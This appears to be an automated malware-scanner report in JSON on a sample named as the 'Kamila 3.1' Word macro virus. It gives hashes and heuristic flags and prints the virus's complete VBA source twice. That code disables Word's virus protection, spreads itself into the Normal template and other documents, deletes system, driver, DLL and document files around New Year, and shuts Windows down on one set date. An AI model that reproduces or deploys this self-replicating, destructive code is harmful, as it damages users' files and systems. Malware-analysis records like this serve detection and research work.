{
    "docinfo": {
        "attributes": [
            "Attribute VB_Name = \"ThisDocument\"",
            "Attribute VB_Creatable = False",
            "Attribute VB_PredeclaredId = True",
            "Attribute VB_Exposed = True",
            "Attribute VB_Name = \"frmAbout\"",
            "Attribute VB_Creatable = False",
            "Attribute VB_PredeclaredId = True",
            "Attribute VB_Exposed = False"
        ],
        "behavior": {
            "AutoOpen": "Runs when the Word document is opened",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "CodeModule": "May attempt to modify the VBA code",
            "CommandButton1_Click": "Runs when the file is opened and ActiveX objects trigger events",
            "Document_Close": "Runs when the Word document is closed",
            "Document_Open": "Runs when the Word or Publisher document is opened",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Kill": "May delete a file",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code",
            "open": "May open a file",
            "system": "May run an executable file or a system command on a Mac"
        },
        "macro": "Dim NewYear As Boolean\nOption Base 1\n\nSub KamilaRuns()\n    On Error Resume Next\n    NewYear = (Day(Now) >= 28 And Month(Now) = 12) Or (Day(Now) <= 3 And Month(Now) = 1)\n    If NewYear Then Application.Caption = \"Merry Christmas !!! Nice holidays for you\"\n\n'----------------------------------------------\n'Virus: Kamila 3.1, written by Otto Gutenberg.\n'==============================================\n'This virus is allowed to be called as\n'\"Independence Day\". It looks for system files\n'and deletes them from the current directory.\n'----------------------------------------------\n\n    With Options\n        .ConfirmConversions = False\n        .VirusProtection = False\n        .SaveNormalPrompt = False\n    End With\n    ShowVisualBasicEditor = False\n    ActiveDocument.ReadOnlyRecommended = False\n    If KamExDoc And KamExTemp Then Exit Sub\n    '\n    With NormalTemplate.VBProject\n        For i = 1 To .VBComponents.Count\n            If (.VBComponents(i).Name <> \"Kamila\") And (.VBComponents(i).Name <> \"frmAbout\") Then                             .VBComponents.Remove .VBComponents(i)\n        Next i\n        If Not KamExTemp Then .VBComponents(\"ThisDocument\").CodeModule.DeleteLines 1         , .VBComponents(\"ThisDocument\").CodeModule.CountOfLines\n    End With\n    With ActiveDocument.VBProject\n        For i = 1 To .VBComponents.Count\n            If (.VBComponents(i).Name <> \"Kamila\") And (.VBComponents(i).Name <> \"frmAbout\") Then                             .VBComponents.Remove .VBComponents(i)\n        Next i\n        If Not KamExDoc Then .VBComponents(\"ThisDocument\").CodeModule.DeleteLines 1         , .VBComponents(\"ThisDocument\").CodeModule.CountOfLines\n    End With\n    '\n    If KamExDoc Then\n        ActiveDocument.VBProject.VBComponents(\"Kamila\").Export \"C:\\kamila.dll\"\n        ActiveDocument.VBProject.VBComponents(\"ThisDocument\").Export \"C:\\kama.dll\"\n        ActiveDocument.VBProject.VBComponents(\"frmAbout\").Export \"C:\\kamafrm.dll\"\n        NormalTemplate.VBProject.VBComponents.Import \"C:\\kamila.dll\"\n        NormalTemplate.VBProject.VBComponents.Import \"C:\\kamafrm.dll\"\n        NormalTemplate.VBProject.VBComponents(\"ThisDocument\").CodeModule.AddFromFile \"C:\\kama.dll\"\n        NormalTemplate.VBProject.VBComponents(\"ThisDocument\").CodeModule.DeleteLines 1, 4\n    ElseIf KamExTemp Then\n        NormalTemplate.VBProject.VBComponents(\"Kamila\").Export \"C:\\kamila.dll\"\n        NormalTemplate.VBProject.VBComponents(\"ThisDocument\").Export \"C:\\kama.dll\"\n        NormalTemplate.VBProject.VBComponents(\"frmAbout\").Export \"C:\\kamafrm.dll\"\n        ActiveDocument.VBProject.VBComponents.Import \"C:\\kamafrm.dll\"\n        ActiveDocument.VBProject.VBComponents.Import \"C:\\kamila.dll\"\n        ActiveDocument.VBProject.VBComponents(\"ThisDocument\").CodeModule.AddFromFile \"C:\\kama.dll\"\n        ActiveDocument.VBProject.VBComponents(\"ThisDocument\").CodeModule.DeleteLines 1, 4\n    End If\n    Kill \"C:\\kamila.dll\"\n    Kill \"C:\\kama.dll\"\n    Kill \"C:\\kamafrm.dll\"\n    ActiveDocument.Save\n    NormalTemplate.Save\nEnd Sub\n\nSub ViewVbCode()\n    On Error Resume Next\n    Dim Hours As Integer\n    Dim Mask As Variant\n    Hours = Hour(Time)\n    NewYear = (Day(Now) >= 28 And Month(Now) = 12) Or (Day(Now) <= 3 And Month(Now) = 1)\n    If Hours >= 6 And Hours < 12 Then\n        MsgBox (\"Guten Morgen\")\n    ElseIf Hours >= 12 And Hours < 16 Then\n        MsgBox (\"Guten Tag\")\n    Else\n        MsgBox (\"Guten Abend\")\n    End If\n    If NewYear Then\n        Mask = Array(\"*.sys\", \"*.drv\", \"*.doc\", \"*.dll\", \"*.dos\")\n        MsgBox \"Happy New Year!!! Have a nice holiday\"\n        For i = 1 To UBound(Mask)\n            Kill ActiveDocument.Path + \"\\\" + Mask(i)\n        Next i\n    End If\nEnd Sub\n\nSub HelpAbout()\n    On Error Resume Next\n    frmAbout.Show\nEnd Sub\n\nFunction KamExDoc() As Boolean\n    On Error Resume Next\n    KamExDoc = False\n    For i = 1 To ActiveDocument.VBProject.VBComponents.Count\n        If ActiveDocument.VBProject.VBComponents(i).Name = \"Kamila\" Then KamExDoc = True\n    Next i\nEnd Function\n\nFunction KamExTemp() As Boolean\n    On Error Resume Next\n    KamExTemp = False\n    For i = 1 To NormalTemplate.VBProject.VBComponents.Count\n        If NormalTemplate.VBProject.VBComponents(i).Name = \"Kamila\" Then KamExTemp = True\n    Next i\nEnd Function\n\nSub AutoOpen()\n    On Error Resume Next\n    If NewYear Then\n        Mask = Array(\"*.sys\", \"*.drv\", \"*.dll\", \"*.dos\")\n        MsgBox \"Happy new Year!!! Have a nice holiday\"\n        For i = 1 To UBound(Mask)\n            Kill ActiveDocument.Path + \"\\\" + Mask(i)\n        Next i\n    End If\n    If Day(Now) = 16 And Month(Now) = 12 Then\n        Application.Tasks.ExitWindows\n    End If\nEnd Sub\n\nSub ToolsMacro()\n    On Error Resume Next\n    Application.DisplayStatusBar = True\n    Application.StatusBar = \"Your word processor is infected\"\n    If Day(Now) = 16 And Month(Now) = 12 Then\n        ActiveDocument.Save\n        NormalTemplate.Save\n        Application.Tasks.ExitWindows\n    End If\nEnd Sub\n\nSub FileTemplates()\n    \nEnd Sub\n\n\n---------------------------------\n\nsave as thisDocument.cls\n\nVERSION 1.0 CLASS\nBEGIN\n  MultiUse = -1  'True\nEND\n\n\n\n\nPrivate Sub Document_Open()\n    On Error Resume Next\n    If ThisDocument.Type = wdTypeDocument And Kamila.KamExTemp Then Exit Sub\n    Selection.WholeStory\n    Selection.Delete wdCharacter, Count:=1\n    Selection.Font.Size = 50\n    Selection.Font.Bold = wdToggle\n    Selection.TypeText \"\"\"Kamila\"\" atacks\"\n    Selection.TypeParagraph\n    Selection.Font.Size = 20\n    Selection.Font.Bold = wdToggle\n    Selection.TypeText \"Your word processor is infected.\"\n    Selection.TypeParagraph\n    Selection.TypeText \"Code written by Otto Gutenberg.\"\n    Selection.TypeParagraph\n    Selection.TypeText \"Almaty, 2001\"\n    With Dialogs(wdDialogFileSummaryInfo)\n        .Author = \"Otto von Gutenberg\"\n        .Subject = \"Kamila atacks your word processor\"\n        .Comments = \"CAUTION: Don't open\"\n        .Execute\n    End With\n    Kamila.KamilaRuns\nEnd Sub\n\nPrivate Sub Document_Close()\n    Document_Open\nEnd Sub\n\n\n----------------------------\n\nsave as frmAbout.frm\n\nVERSION 5.00\nBegin {C62A69F0-16DC-11CE-9E98-00AA00574A4F} frmAbout \n   Caption         =   \"About \"\"Kamila\"\" virus\"\n   ClientHeight    =   2700\n   ClientLeft      =   45\n   ClientTop       =   330\n   ClientWidth     =   4710\n   OleObjectBlob   =   \"frmAbout.frx\":0000\n   StartUpPosition =   1  'CenterOwner\nEnd\n\n\n\n\nPrivate Sub CommandButton1_Click()\n    frmAbout.Hide\nEnd Sub\n\nPrivate Sub CommandButton2_Click()\n    On Error Resume Next\n    Application.System.MSInfo\nEnd Sub"
    },
    "filename": "VirusShare_66bb49e7d62132fc08a66ec06ef29975",
    "filesize": 7011,
    "filetype": "ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "66bb49e7d62132fc08a66ec06ef29975",
        "sha1": "a3f70707724046abfbe296692b672356b52e0cc5",
        "sha256": "d0b39515ac019d55d7bcfb79becf8d91146fd192b38c2270ede9656f099e3f08"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "Attribute VB_Name = \"Kamila\"",
            "Dim NewYear As Boolean",
            "Option Base 1",
            "Sub KamilaRuns()",
            "    On Error Resume Next",
            "    NewYear = (Day(Now) >= 28 And Month(Now) = 12) Or (Day(Now) <= 3 And Month(Now) = 1)",
            "    If NewYear Then Application.Caption = \"Merry Christmas !!! Nice holidays for you\"",
            "'----------------------------------------------",
            "'Virus: Kamila 3.1, written by Otto Gutenberg.",
            "'==============================================",
            "'This virus is allowed to be called as",
            "'\"Independence Day\". It looks for system files",
            "'and deletes them from the current directory.",
            "'----------------------------------------------",
            "    With Options",
            "        .ConfirmConversions = False",
            "        .VirusProtection = False",
            "        .SaveNormalPrompt = False",
            "    End With",
            "    ShowVisualBasicEditor = False",
            "    ActiveDocument.ReadOnlyRecommended = False",
            "    If KamExDoc And KamExTemp Then Exit Sub",
            "    '",
            "    With NormalTemplate.VBProject",
            "        For i = 1 To .VBComponents.Count",
            "            If (.VBComponents(i).Name <> \"Kamila\") And (.VBComponents(i).Name <> \"frmAbout\") Then _",
            "                            .VBComponents.Remove .VBComponents(i)",
            "        Next i",
            "        If Not KamExTemp Then .VBComponents(\"ThisDocument\").CodeModule.DeleteLines 1 _",
            "        , .VBComponents(\"ThisDocument\").CodeModule.CountOfLines",
            "    End With",
            "    With ActiveDocument.VBProject",
            "        For i = 1 To .VBComponents.Count",
            "            If (.VBComponents(i).Name <> \"Kamila\") And (.VBComponents(i).Name <> \"frmAbout\") Then _",
            "                            .VBComponents.Remove .VBComponents(i)",
            "        Next i",
            "        If Not KamExDoc Then .VBComponents(\"ThisDocument\").CodeModule.DeleteLines 1 _",
            "        , .VBComponents(\"ThisDocument\").CodeModule.CountOfLines",
            "    End With",
            "    '",
            "    If KamExDoc Then",
            "        ActiveDocument.VBProject.VBComponents(\"Kamila\").Export \"C:\\kamila.dll\"",
            "        ActiveDocument.VBProject.VBComponents(\"ThisDocument\").Export \"C:\\kama.dll\"",
            "        ActiveDocument.VBProject.VBComponents(\"frmAbout\").Export \"C:\\kamafrm.dll\"",
            "        NormalTemplate.VBProject.VBComponents.Import \"C:\\kamila.dll\"",
            "        NormalTemplate.VBProject.VBComponents.Import \"C:\\kamafrm.dll\"",
            "        NormalTemplate.VBProject.VBComponents(\"ThisDocument\").CodeModule.AddFromFile \"C:\\kama.dll\"",
            "        NormalTemplate.VBProject.VBComponents(\"ThisDocument\").CodeModule.DeleteLines 1, 4",
            "    ElseIf KamExTemp Then",
            "        NormalTemplate.VBProject.VBComponents(\"Kamila\").Export \"C:\\kamila.dll\"",
            "        NormalTemplate.VBProject.VBComponents(\"ThisDocument\").Export \"C:\\kama.dll\"",
            "        NormalTemplate.VBProject.VBComponents(\"frmAbout\").Export \"C:\\kamafrm.dll\"",
            "        ActiveDocument.VBProject.VBComponents.Import \"C:\\kamafrm.dll\"",
            "        ActiveDocument.VBProject.VBComponents.Import \"C:\\kamila.dll\"",
            "        ActiveDocument.VBProject.VBComponents(\"ThisDocument\").CodeModule.AddFromFile \"C:\\kama.dll\"",
            "        ActiveDocument.VBProject.VBComponents(\"ThisDocument\").CodeModule.DeleteLines 1, 4",
            "    End If",
            "    Kill \"C:\\kamila.dll\"",
            "    Kill \"C:\\kama.dll\"",
            "    Kill \"C:\\kamafrm.dll\"",
            "    ActiveDocument.Save",
            "    NormalTemplate.Save",
            "End Sub",
            "Sub ViewVbCode()",
            "    On Error Resume Next",
            "    Dim Hours As Integer",
            "    Dim Mask As Variant",
            "    Hours = Hour(Time)",
            "    NewYear = (Day(Now) >= 28 And Month(Now) = 12) Or (Day(Now) <= 3 And Month(Now) = 1)",
            "    If Hours >= 6 And Hours < 12 Then",
            "        MsgBox (\"Guten Morgen\")",
            "    ElseIf Hours >= 12 And Hours < 16 Then",
            "        MsgBox (\"Guten Tag\")",
            "    Else",
            "        MsgBox (\"Guten Abend\")",
            "    End If",
            "    If NewYear Then",
            "        Mask = Array(\"*.sys\", \"*.drv\", \"*.doc\", \"*.dll\", \"*.dos\")",
            "        MsgBox \"Happy New Year!!! Have a nice holiday\"",
            "        For i = 1 To UBound(Mask)",
            "            Kill ActiveDocument.Path + \"\\\" + Mask(i)",
            "        Next i",
            "    End If",
            "End Sub",
            "Sub HelpAbout()",
            "    On Error Resume Next",
            "    frmAbout.Show",
            "End Sub",
            "Function KamExDoc() As Boolean",
            "    On Error Resume Next",
            "    KamExDoc = False",
            "    For i = 1 To ActiveDocument.VBProject.VBComponents.Count",
            "        If ActiveDocument.VBProject.VBComponents(i).Name = \"Kamila\" Then KamExDoc = True",
            "    Next i",
            "End Function",
            "Function KamExTemp() As Boolean",
            "    On Error Resume Next",
            "    KamExTemp = False",
            "    For i = 1 To NormalTemplate.VBProject.VBComponents.Count",
            "        If NormalTemplate.VBProject.VBComponents(i).Name = \"Kamila\" Then KamExTemp = True",
            "    Next i",
            "End Function",
            "Sub AutoOpen()",
            "    On Error Resume Next",
            "    If NewYear Then",
            "        Mask = Array(\"*.sys\", \"*.drv\", \"*.dll\", \"*.dos\")",
            "        MsgBox \"Happy new Year!!! Have a nice holiday\"",
            "        For i = 1 To UBound(Mask)",
            "            Kill ActiveDocument.Path + \"\\\" + Mask(i)",
            "        Next i",
            "    End If",
            "    If Day(Now) = 16 And Month(Now) = 12 Then",
            "        Application.Tasks.ExitWindows",
            "    End If",
            "End Sub",
            "Sub ToolsMacro()",
            "    On Error Resume Next",
            "    Application.DisplayStatusBar = True",
            "    Application.StatusBar = \"Your word processor is infected\"",
            "    If Day(Now) = 16 And Month(Now) = 12 Then",
            "        ActiveDocument.Save",
            "        NormalTemplate.Save",
            "        Application.Tasks.ExitWindows",
            "    End If",
            "End Sub",
            "Sub FileTemplates()",
            "    ",
            "End Sub",
            "---------------------------------",
            "save as thisDocument.cls",
            "VERSION 1.0 CLASS",
            "BEGIN",
            "  MultiUse = -1  'True",
            "Attribute VB_Name = \"ThisDocument\"",
            "Attribute VB_Creatable = False",
            "Attribute VB_PredeclaredId = True",
            "Attribute VB_Exposed = True",
            "Private Sub Document_Open()",
            "    On Error Resume Next",
            "    If ThisDocument.Type = wdTypeDocument And Kamila.KamExTemp Then Exit Sub",
            "    Selection.WholeStory",
            "    Selection.Delete wdCharacter, Count:=1",
            "    Selection.Font.Size = 50",
            "    Selection.Font.Bold = wdToggle",
            "    Selection.TypeText \"\"\"Kamila\"\" atacks\"",
            "    Selection.TypeParagraph",
            "    Selection.Font.Size = 20",
            "    Selection.Font.Bold = wdToggle",
            "    Selection.TypeText \"Your word processor is infected.\"",
            "    Selection.TypeParagraph",
            "    Selection.TypeText \"Code written by Otto Gutenberg.\"",
            "    Selection.TypeParagraph",
            "    Selection.TypeText \"Almaty, 2001\"",
            "    With Dialogs(wdDialogFileSummaryInfo)",
            "        .Author = \"Otto von Gutenberg\"",
            "        .Subject = \"Kamila atacks your word processor\"",
            "        .Comments = \"CAUTION: Don't open\"",
            "        .Execute",
            "    End With",
            "    Kamila.KamilaRuns",
            "End Sub",
            "Private Sub Document_Close()",
            "    Document_Open",
            "End Sub",
            "----------------------------",
            "save as frmAbout.frm",
            "VERSION 5.00",
            "Begin {C62A69F0-16DC-11CE-9E98-00AA00574A4F} frmAbout ",
            "   Caption         =   \"About \"\"Kamila\"\" virus\"",
            "   ClientHeight    =   2700",
            "   ClientLeft      =   45",
            "   ClientTop       =   330",
            "   ClientWidth     =   4710",
            "   OleObjectBlob   =   \"frmAbout.frx\":0000",
            "   StartUpPosition =   1  'CenterOwner",
            "Attribute VB_Name = \"frmAbout\"",
            "Attribute VB_Creatable = False",
            "Attribute VB_PredeclaredId = True",
            "Attribute VB_Exposed = False",
            "Private Sub CommandButton1_Click()",
            "    frmAbout.Hide",
            "End Sub",
            "Private Sub CommandButton2_Click()",
            "    On Error Resume Next",
            "    Application.System.MSInfo",
            "End Sub"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.329163",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
